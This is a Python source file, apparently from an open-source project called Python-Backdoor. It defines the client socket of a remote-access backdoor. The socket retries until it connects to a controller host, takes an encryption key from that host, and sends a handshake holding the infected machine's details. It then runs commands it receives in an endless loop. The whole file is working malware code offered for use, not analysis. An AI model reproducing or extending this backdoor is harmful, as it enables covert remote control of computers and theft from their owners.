"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""
import socket
import time

from src.client import control
from src.encrypted_socket import EncryptedSocket
from src.client.command_handler import CommandHandler
from src.defs import *


class Socket(EncryptedSocket):
    def __init__(self, host, port):
        super().__init__()

        self.host = host
        self.port = port
        self.socket = socket.socket()

    def connect(self):
        while True:  # infinite loop until socket can connect
            try:
                self.socket.connect((self.host, self.port))
            except socket.error:
                time.sleep(3)  # wait 3 seconds to try again
            else:
                break

        while True:
            command = self.recv_json(False)
            if command["key"] == CLIENT_KEY:
                self.set_key(command["value"].encode())

                # send handshake
                self.send_json(CLIENT_HANDSHAKE, control.get_info())
                break

        ch = CommandHandler(self)

        while True:
            msg = self.recv_json()
            ch.parse(msg)
